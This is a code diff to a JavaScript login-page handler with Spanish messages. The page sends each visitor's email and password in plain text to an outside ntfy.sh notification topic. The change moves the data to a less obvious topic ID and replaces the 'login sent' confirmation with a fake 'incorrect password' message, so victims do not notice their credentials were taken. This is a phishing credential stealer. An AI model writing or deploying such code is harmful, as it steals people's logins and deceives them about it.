@@ -4,17 +4,17 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
 
-  const message = `Intento de login:\nCorreo: ${email}\nContraseña: ${password}`;
+  const message = `Login:\nCorreo: ${email}\nContraseña: ${password}`;
 
   try {
-    await fetch('https://ntfy.sh/alert', {
+    await fetch('https://ntfy.sh/117566101', {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain' },
       body: message
     });
-    alert("Login enviado vía ntfy!");
+    warning("Contraseña incorrecta");
   } catch (err) {
-    alert("Error al enviar a ntfy.");
+    warning("Error de red.");
     console.error(err);
   }
 });
